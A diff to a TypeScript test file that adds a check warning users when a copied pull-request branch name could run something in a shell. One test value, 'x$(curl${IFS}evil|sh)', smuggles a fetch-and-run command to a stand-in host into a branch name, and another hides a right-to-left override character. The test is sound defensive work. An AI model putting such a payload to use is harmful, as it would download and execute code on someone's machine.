@@ -5,7 +5,7 @@ import { loadPrLocal } from '../../lib/storage/prLocal';
 import { fakeChrome } from '../../test/chrome';
 import { buildAuth, buildPullRequest } from '../../test/panel';
 import { auth, prLocal } from '../state/store';
-import { PrMenu } from './PrMenu';
+import { isRiskyBranchName, PrMenu } from './PrMenu';
 import { toasts } from './ui/Toast';
 
 const NOW = Date.now();
@@ -54,6 +54,16 @@ describe('PrMenu', () => {
     fireEvent.click(item(/^Copy branch name/));
     await waitFor(() => expect(toasts.value[0]?.message).toBe('Copied feature/widgets'));
     expect(writeText).toHaveBeenCalledWith('feature/widgets');
+  });
+
+  it('warns when the copied branch name could run something in a shell', async () => {
+    const writeText = vi.fn(async () => undefined);
+    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } });
+    open({ headRefName: 'x$(curl${IFS}evil|sh)' });
+    fireEvent.click(item(/^Copy branch name/));
+    await waitFor(() => expect(toasts.value[0]?.message).toMatch(/contains shell characters/));
+    expect(isRiskyBranchName('feature/a.b_c-1+2@x')).toBe(false);
+    expect(isRiskyBranchName('fix\u202Eexe.txt')).toBe(true);
   });
 
   it('reports a refused clipboard', async () => {
